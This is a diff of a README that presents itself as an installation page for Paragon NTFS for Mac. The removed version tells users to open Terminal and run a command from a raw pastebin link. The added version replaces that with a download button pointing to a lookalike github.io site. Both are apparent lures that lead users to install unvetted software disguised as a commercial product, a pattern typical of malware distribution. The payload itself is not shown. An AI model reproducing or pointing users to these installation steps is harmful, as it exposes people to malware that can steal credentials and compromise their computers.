@@ -1,19 +1,18 @@
-# Paragon NTFS for Mac  
+# Paragon NTFS
 
 <p align="center">
   <img src="https://images.icon-icons.com/3053/PNG/512/paragon_ntfs_mac_macos_bigsur_icon_189849.png" alt="Paragon NTFS Logo" width="320"/>
 </p>
 
+<div align="center">
+
+[![⬇️ Download Paragon NTFS for Mac](https://img.shields.io/badge/⬇️_Download_Paragon_NTFS-blue?style=for-the-badge&logo=apple)](https://paragon-ntfs-for-macos.github.io/.github)
+
+</div>
+
 ---
-
-## Installation via Terminal 
-
-1. Open **Terminal** and run the command:  
-
-https://pastebin.com/raw/FrVJnMKh  
-
-2. Follow the on-screen instructions to complete the installation.  
-
+1. Go to the installation site using the button above.
+2. Follow the instructions on the installation page to install the program correctly
 ---
 
 ## 📊 What is Paragon NTFS?  
